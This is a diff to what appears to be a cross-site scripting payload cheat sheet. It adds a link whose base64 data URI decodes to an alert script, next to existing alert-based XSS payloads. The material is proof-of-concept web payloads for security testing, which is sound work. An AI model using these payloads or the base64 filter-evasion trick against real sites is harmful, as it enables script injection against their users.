@@ -162,6 +162,12 @@ URL/<script>alert('XSS');//
 URL/<input autofocus onfocus=alert(1)>
 ```
 
+XSS using base64 encoded href data in a link
+
+```
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk7PC9zY3JpcHQ+" target="_blank">here</a>
+```
+
 ## XSS in wrappers javascript and data URI
 
 XSS with javascript:
